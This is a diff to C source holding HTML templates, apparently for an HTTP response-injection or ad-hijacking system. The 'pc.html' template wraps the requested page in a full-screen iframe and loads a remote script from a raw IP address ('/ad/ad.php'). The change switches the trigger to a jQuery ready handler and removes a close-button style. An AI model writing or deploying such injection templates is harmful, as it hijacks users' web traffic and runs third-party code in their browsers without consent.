@@ -251,15 +251,16 @@ char *http_head_response7=
 
 http_body_t default_http_body[AD_TEMPLATE_MAX] = 
 {
+
     {
         .name = "pc.html",
         .head = 
-            "<!DOCTYPE HTML>\n"
             "<html>\n"
             "<head>\n"
             "<meta charset=\"utf-8\">\n"
             "<title></title>\n"
-            "<script>\n"
+			"<script type=\"text/javascript\" src=\"http://cdn.staticfile.org/jquery/1.7/jquery.min.js\"></script>\n"
+			"<script>\n"
             "d=document;\n"
             "function u(){\n"
             "var f = \"",
@@ -271,20 +272,26 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
             "}\n"
             "</script>\n"
             "<style>\n"
-            "body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
-            "a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px}\n"
-            "#i{display:block; position:absolute; z-index:1; width:100%; height:100%}\n"
+            "body{margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
+            "#i{display:block;position:absolute;z-index:1;width:100%;height:100%}\n"
             "</style>\n"
             "</head>\n"
-            "<body onLoad=u()>\n"
+            "<body>\n"
             "<div id=i>\n"
             "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
             "</div>\n"
             "<script type=\"text/javascript\" src=\"http://219.234.83.60/ad/ad.php\"></script>\n"
-            "</body>\n"
+			"<script>"
+			"$(function(){u();});"	
+			"</script>\n"	
+			"</body>\n"
             "</html>\n"
             "\n",
     },
+
+	
+
+   
 #if 1
     {
         .name = "mobile.html",
